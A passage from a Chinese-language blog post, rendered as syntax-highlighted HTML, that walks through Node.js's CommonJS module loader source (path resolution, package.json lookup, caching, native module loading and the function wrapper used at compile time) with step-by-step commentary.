<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> PL <span class="token operator">=</span> paths<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> PL<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Don't search further if path doesn't exist</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>paths<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stat</span><span class="token punctuation">(</span>paths<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token keyword">var</span> basePath <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>paths<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> filename<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>trailingSlash<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 模块路径⾮“/”结尾，那么可能是⽂件，也可能是⽂件夹</span>          <span class="token keyword">const</span> rc <span class="token operator">=</span> <span class="token function">stat</span><span class="token punctuation">(</span>basePath<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 判断⽂件类型，是⼀个⽂件还是⽬录</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//a. 如果是⼀个⽂件，则转换为真实路径</span>            filename <span class="token operator">=</span> <span class="token function">toRealPath</span><span class="token punctuation">(</span>basePath<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>rc <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">//b. 如果是⼀个⽬录，则调⽤tryPackage⽅法读取该⽬录下的</span>            <span class="token keyword">package</span><span class="token punctuation">.</span>json⽂件，把⾥⾯的 main属性设置为filename            filename <span class="token operator">=</span> <span class="token function">tryPackage</span><span class="token punctuation">(</span>basePath<span class="token punctuation">,</span> exts<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>          <span class="token comment" spellcheck="true">//c. 如果没有读到路径上的⽂件，则通过tryExtensions尝试在该路径后依次加上.js，.json 和.node后            缀，判断是否存在，若存在则返回加上后缀后的路径</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">{</span>            filename <span class="token operator">=</span> <span class="token function">tryExtensions</span><span class="token punctuation">(</span>basePath<span class="token punctuation">,</span> exts<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>         <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">//第三步：如果依然不存在，则同样调⽤tryPackage⽅法读取该⽬录下的package.json⽂件，把⾥⾯的           main属性设置为filename</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">{</span>        filename <span class="token operator">=</span> <span class="token function">tryPackage</span><span class="token punctuation">(</span>basePath<span class="token punctuation">,</span> exts<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">//第四步： 如果依然不存在，则尝试在该路径后依次加上index.js，index.json和index.node，判断是 否 存在，若存在则返回拼接后的路径。</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>filename<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// try it with each of the extensions at "index"</span>        filename <span class="token operator">=</span> <span class="token function">tryExtensions</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>basePath<span class="token punctuation">,</span> <span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exts<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">//第五步：若解析成功，则把解析得到的⽂件名cache起来，下次require就不⽤再次解析了</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Warn once if '.' resolved outside the module dir</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token operator">===</span> <span class="token string">'.'</span> <span class="token operator">&amp;&amp;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          warned <span class="token operator">=</span> internalUtil<span class="token punctuation">.</span><span class="token function">printDeprecationMessage</span><span class="token punctuation">(</span>          <span class="token string">'warning: require(\'.\') resolved outside the package '</span> <span class="token operator">+</span>          'directory<span class="token punctuation">.</span> This functionality is deprecated and will be          removed <span class="token string">' +'</span>soon<span class="token punctuation">.</span>'<span class="token punctuation">,</span> warned<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        Module<span class="token punctuation">.</span>_pathCache<span class="token punctuation">[</span>cacheKey<span class="token punctuation">]</span> <span class="token operator">=</span> filename<span class="token punctuation">;</span>        <span class="token keyword">return</span> filename<span class="token punctuation">;</span>      <span class="token punctuation">}</span>     <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//第六步： 若解析失败，则返回false</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//tryPackage</span><span class="token keyword">function</span> <span class="token function">tryPackage</span><span class="token punctuation">(</span>requestPath<span class="token punctuation">,</span> exts<span class="token punctuation">,</span> isMain<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> pkg <span class="token operator">=</span> <span class="token function">readPackage</span><span class="token punctuation">(</span>requestPath<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pkg<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> filename <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>requestPath<span class="token punctuation">,</span> pkg<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">tryFile</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> isMain<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token comment" spellcheck="true">//直接判断这个⽂件是否存在并返回</span>  <span class="token function">tryExtensions</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> exts<span class="token punctuation">,</span> isMain<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token comment" spellcheck="true">//判断分别以js,json,node等后缀结尾的⽂件是否存在</span>  <span class="token function">tryExtensions</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">resolve</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'index'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> exts<span class="token punctuation">,</span> isMain<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//判断分别以${filename}/index.(js|json|node)等后缀结尾的⽂件是否存在</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//tryExtensions</span><span class="token keyword">function</span> <span class="token function">tryExtensions</span><span class="token punctuation">(</span>p<span class="token punctuation">,</span> exts<span class="token punctuation">,</span> isMain<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> exts<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> filename <span class="token operator">=</span> <span class="token function">tryFile</span><span class="token punctuation">(</span>p <span class="token operator">+</span> exts<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> isMain<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">return</span> filename<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//tryFile</span><span class="token keyword">function</span> <span class="token function">tryFile</span><span class="token punctuation">(</span>requestPath<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> rc <span class="token operator">=</span> <span class="token function">stat</span><span class="token punctuation">(</span>requestPath<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> rc <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token function">toRealPath</span><span class="token punctuation">(</span>requestPath<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//toRealPath</span><span class="token keyword">function</span> <span class="token function">toRealPath</span><span class="token punctuation">(</span>requestPath<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> fs<span class="token punctuation">.</span><span class="token function">realpathSync</span><span class="token punctuation">(</span>requestPath<span class="token punctuation">,</span> Module<span class="token punctuation">.</span>_realpathCache<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>查找策略</strong>  </p><ol><li>require()传入的字符串最后一个字符不是/时：<ol><li>如果是个文件，直接返回这个文件的路径</li><li>如果是个文件夹，则查找该文件夹下是否有package.json文件，以及这个文件 当中的main字段对应的路径(对应源码当中的方法为tryPackage)： <ol><li>如果main字段对应的路径是一个文件且存在，直接返回这个路径</li><li>在main字段对应的路径后依次加上 .js ， .json 和 .node 后缀，判断是否 存在，若存在则返回加上后缀后的路径。</li><li>在main字段对应的路径后依次加上 index.js ，index.json 和 index.node， 判断是否存在，若存在则返回拼接后的路径。</li></ol></li><li>对文件路径后分别添加.js，.json，.node后缀，判断是否存在，若存在则返回 加上后缀后的路径。</li></ol></li><li>require()传入的字符串最后一个字符是/时，即require的是一个文件夹时： <ol><li>查询该文件夹下的package.json文件中的main字段对应的路径，步骤如1.2</li><li>该路径后依次加上 index.js ，index.json 和 index.node，判断是否存在，若 存在则返回拼接后的路径。</li></ol></li></ol><h4 id="6、路径解析完毕，再次返回Module-load"><a href="#6、路径解析完毕，再次返回Module-load" class="headerlink" title="6、路径解析完毕，再次返回Module._load"></a><strong>6</strong>、路径解析完毕，再次返回<strong>Module._load</strong></h4><pre class="line-numbers language-js"><code class="language-js">Module<span class="token punctuation">.</span>_load <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> parent<span class="token punctuation">,</span> isMain<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//解析⽂件绝对路径</span>  <span class="token comment" spellcheck="true">//第⼀步： 先检查是否在⽂件模块缓存中，如果有缓存，直接取缓存，Module._cache存放⽂件模块</span>  <span class="token keyword">var</span> filename <span class="token operator">=</span> Module<span class="token punctuation">.</span><span class="token function">resolveFilename</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> cachedModule <span class="token operator">=</span> Module<span class="token punctuation">.</span>_cache<span class="token punctuation">[</span>filename<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>cachedModule<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> cachedModule<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>   <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//第⼆步： 检测是否是原⽣模块，如果是，使⽤原⽣模块的加载⽅法</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>NativeModule<span class="token punctuation">.</span><span class="token function">nonInternalExists</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">debug</span><span class="token punctuation">(</span><span class="token string">'load native module %s'</span><span class="token punctuation">,</span> request<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> NativeModule<span class="token punctuation">.</span><span class="token function">require</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//第三步： 判断⽆缓存且⾮原⽣模块后，新建模块实例</span>  <span class="token keyword">var</span> module <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Module</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>isMain<span class="token punctuation">)</span> <span class="token punctuation">{</span>    process<span class="token punctuation">.</span>mainModule <span class="token operator">=</span> module<span class="token punctuation">;</span>    module<span class="token punctuation">.</span>id <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//加载模块前，就将模块缓存</span>  Module<span class="token punctuation">.</span>_cache<span class="token punctuation">[</span>filename<span class="token punctuation">]</span> <span class="token operator">=</span> module<span class="token punctuation">;</span>  <span class="token keyword">var</span> hadException <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//第四步： 加载模块</span>  <span class="token keyword">try</span> <span class="token punctuation">{</span>    module<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    hadException <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>hadException<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">delete</span> Module<span class="token punctuation">.</span>_cache<span class="token punctuation">[</span>filename<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//加载失败，删除缓存</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> module<span class="token punctuation">.</span>exports<span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>NativeModule.require</strong>  </p><p>主要⽤来加载Node.js的⼀些原⽣模块。  </p><p>源码：</p><pre class="line-numbers language-js"><code class="language-js">NativeModule<span class="token punctuation">.</span>require <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//1、判断是否是⾃身</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>id <span class="token operator">==</span> <span class="token string">'native_module'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> NativeModule  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//2、是否有缓存，原⽣模块存放在NativeModule._cache中</span>  <span class="token keyword">var</span> cached <span class="token operator">=</span> NativeModule<span class="token punctuation">.</span><span class="token function">getCached</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>cached<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> cached<span class="token punctuation">.</span>exports<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//3、是否是原⽣模块</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>NativeModule<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'No such native module '</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">//4、存放在模块加载列表⾥</span>  process<span class="token punctuation">.</span>moduleLoadList<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token string">'NativeModule '</span> <span class="token operator">+</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//5、载⼊该原⽣模块、缓存、编译、返回</span>  <span class="token keyword">var</span> nativeModule <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NativeModule</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>  nativeModule<span class="token punctuation">.</span><span class="token function">cache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  nativeModule<span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> nativeModule<span class="token punctuation">.</span>exports<span class="token punctuation">;</span> <span class="token punctuation">}</span>NativeModule<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>compile <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">var</span> source <span class="token operator">=</span> NativeModule<span class="token punctuation">.</span><span class="token function">getSource</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>  source <span class="token operator">=</span> NativeModule<span class="token punctuation">.</span><span class="token function">wrap</span><span class="token punctuation">(</span>source<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> fn <span class="token operator">=</span> <span class="token function">runInThisContext</span><span class="token punctuation">(</span>source<span class="token punctuation">,</span> <span class="token punctuation">{</span> filename<span class="token punctuation">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>filename <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fn</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>exports<span class="token punctuation">,</span> NativeModule<span class="token punctuation">.</span>require<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>loaded <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>NativeModule<span class="token punctuation">.</span>wrap <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> NativeModule<span class="token punctuation">.</span>wrapper<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> script <span class="token operator">+</span> NativeModule<span class="token punctuation">.</span>wrapper<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>NativeModule<span class="token punctuation">.</span>wrapper <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">'(function (exports, require, module, __filename, __dirname) {\n'</span><span class="token punctuation">,</span><span class="token string">'\n});'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>NativeModule<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>cache <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    NativeModule<span class="token punctuation">.</span>_cache<span class="token punctuation">[</span><span class="token keyword">this</span><span class="token punctuation">.</span>id<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编译执⾏"><a href="#编译执⾏" class="headerlink" title="编译执⾏"></a>编译执⾏</h3><p>通过步骤5找到对应的文件后Node会新建一个模块对象，定义如下： </p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> Module <span class="token punctuation">(</span>id<span class="token punctuation">,</span> parent<span class="token punctuation">)</span> <span class="token punctuation">{</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>parent <span class="token operator">=</span> parent<span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>parent <span class="token operator">&amp;&amp;</span> parent<span class="token punctuation">.</span>children<span class="token punctuation">)</span> <span class="token punctuation">{</span>     parent<span class="token punctuation">.</span>children<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>  <span class="token keyword">this</span><span class="token punctuation">.</span>filename <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>loaded <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>   <span class="token keyword">this</span><span class="token punctuation">.</span>children <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据路径载入并编译。对于不同的文件扩展名，其载入方法不同：  </p><ul><li>.js文件，通过fs模块同步读取文件后编译执行。 </li><li>.node文件。 </li><li>.json文件，通过fs模块同步读取文件后，用JSON.parse()解析返回结果。 </li><li>其余扩展名文件，它们都被当作.js文件载入。</li></ul><p><strong>JS模块编译</strong></p><p>Node对获取的JavaScript文件内容进行头尾包装  </p><ul><li>头部： “(function (exports, require, module, __filename, _dirname {\n” </li><li>尾部：“})”</li></ul><p>2、包装后的代码会通过vm原生模块的runInThisContext()方法，返回一个具体的 function对象。    </p><p>3、将当前模块对象的exports属性、require()方法、module（模块对象自身）以及 在文件定位中得到的完整文件路径和文件目录作为参数传递给这个function()执行。执 行后，模块的exports属性被返回给调用方。</p><h4 id="7、加载模块-Module-prototype-load"><a href="#7、加载模块-Module-prototype-load" class="headerlink" title="7、加载模块 Module.prototype.load"></a><strong>7</strong>、加载模块 <strong>Module.prototype.load</strong></h4><pre class="line-numbers language-js"><code class="language-js">Module<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>load <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">assert</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>loaded<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>filename <span class="token operator">=</span> filename<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//获取这个module路径上所有可能的node_modules路径</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>paths <span class="token operator">=</span> Module<span class="token punctuation">.</span><span class="token function">_nodeModulePaths</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">dirname</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> extension <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">extname</span><span class="token punctuation">(</span>filename<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token string">".js"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>Module<span class="token punctuation">.</span>_extensions<span class="token punctuation">[</span>extension<span class="token punctuation">]</span><span class="token punctuation">)</span> extension <span class="token operator">=</span> <span class="token string">".js"</span><span class="token punctuation">;</span>    Module<span class="token punctuation">.</span>_extensions<span class="token punctuation">[</span>extension<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>loaded <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调⽤<strong>Module._extension</strong>⽅法加载不同格式的⽂件</p><p>以下为js⽂件：  </p><pre class="line-numbers language-js"><code class="language-js">Module<span class="token punctuation">.</span>_extensions<span class="token punctuation">[</span><span class="token string">".js"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>module<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">var</span> content <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFilSync</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//同步读取⽂件的⽂本内容</span>  module<span class="token punctuation">.</span><span class="token function">_compile</span><span class="token punctuation">(</span>internalModule<span class="token punctuation">.</span><span class="token function">stripBOM</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//编译</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>stripBOM</strong>内部原⽣模块的⽅法  </p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">stripBOM</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//检测第⼀额字符是否为BOM;</span>  <span class="token comment" spellcheck="true">//BOM:它常被⽤来当做标示⽂件是以UTF-8、UTF-16或UTF-32编码的记号。</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>content<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFEFF</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    content <span class="token operator">=</span> content<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> content<span class="token punctuation">;</span> <span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="8、编译⽅法Module-prototype-compile"><a href="#8、编译⽅法Module-prototype-compile" class="headerlink" title="8、编译⽅法Module.prototype._compile"></a><strong>8</strong>、编译⽅法<strong>Module.prototype._compile</strong></h4><pre class="line-numbers language-js"><code class="language-js">Module<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>_compile <span class="token operator">=</span> <span class="token 